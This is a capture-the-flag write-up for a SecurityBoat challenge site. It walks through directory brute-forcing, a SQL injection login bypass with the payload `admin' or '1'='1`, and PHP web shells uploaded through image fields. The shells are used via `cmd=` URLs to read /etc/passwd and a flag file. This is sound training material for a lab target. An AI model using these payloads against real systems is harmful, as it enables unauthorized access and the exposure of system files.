# SecurityBoat CTF WriteUp - Jan 2024

Link for CTF: [http://ctf.securityboat.net/](http://ctf.securityboat.net/)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/e7bcf2a8-0e72-43f2-b190-017e2b28e110)

## Recon:

### Without Login:

1. Tried accessing `robot.txt` and `robots.txt`, but no files were found.
![image](https://github.com/aashishsec/WriteUps/assets/65489287/7b013c44-bdd5-41d0-81c1-72e6da03e718)

3. Brute-forced the URL with `feroxbuster`.
   ```
   feroxbuster -u http://ctf.securityboat.net/
   ```
   Interesting folders found: `admin`, `JS`, `assets`.
![image](https://github.com/aashishsec/WriteUps/assets/65489287/03ebd3c7-c1e7-4802-a881-35dec47ed167)

### With Login:

1. Registered to the site with admin credentials.
2. Logged in with admin credentials.
   - Username: admin11
   - Password: 123456789
3. Redirected to [http://ctf.securityboat.net/admin/dashboard.html](http://ctf.securityboat.net/admin/dashboard.html).
4. Bypassed the login panel using SQLi Injection to get admin dashboard.
   - Payload used for SQLi: `admin' or '1'='1`
5. Got access to the admin panel.
![image](https://github.com/aashishsec/WriteUps/assets/65489287/097c9798-2407-43bc-938a-5d44dc925dfc)

## Exploitation:

1. Checked all options in the admin dashboard; found parameters like description and name vulnerable to XSS attacks, and an image upload option for products.
2. For normal users, found an option to upload a profile picture.

### Admin User (File Upload via Edit-Products):

1. Uploaded PHP reverse shell in the image option in products.
   ![Admin|Edit-Products](http://ctf.securityboat.net/assets/products/payload.php)
   ![image](https://github.com/aashishsec/WriteUps/assets/65489287/59eccdce-d54d-48b9-9e09-fb2227abc01d)

3. Enumerated the system:
![image](https://github.com/aashishsec/WriteUps/assets/65489287/19a249ef-965b-44a6-8092-1f859f741b14)

   - [List current directory](http://ctf.securityboat.net/assets/products/payload.php?cmd=pwd)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/615e4256-d514-4030-ac3f-454c12beee4b)

   - [Read `/etc/passwd`](http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/etc/passwd)
   - [Change to `/home` directory and list contents](http://ctf.securityboat.net/assets/products/payload.php?cmd=cd%20/home;ls)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/91dc90a5-d53b-4fae-b25b-e39b72eca46b)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/f8bdbe1d-60e3-4ad4-8245-d5c09dd47099)

   - [Read `/home/flag.txt`](http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/home/flag.txt)
   Flag: `{Unrestr!cted_F!le_Upload_!s_Fun}`

### Normal User (File Upload via Profile Pic):

1. Uploaded PHP reverse shell in the profile pic.
   [Profile Pic Shell](http://ctf.securityboat.net/assets/profPic/payload.php)
2. Enumerated the system:
   - [Read `/etc/passwd`](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/etc/passwd)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/763d8a78-5bd6-4a2a-8ffb-23d377f2dec1)
   - [Change to `/home` directory and list contents](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cd%20/home;ls)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/7dc766da-5e20-4c03-b262-be6337e17007)
![image](https://github.com/aashishsec/WriteUps/assets/65489287/0845a1e0-6071-4a5a-a57a-160cc35d5e15)
   - [Read `/home/flag.txt`](http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/home/flag.txt)
   Flag: `{Unrestr!cted_F!le_Upload_!s_Fun}`

I hope you find this writeup informative!
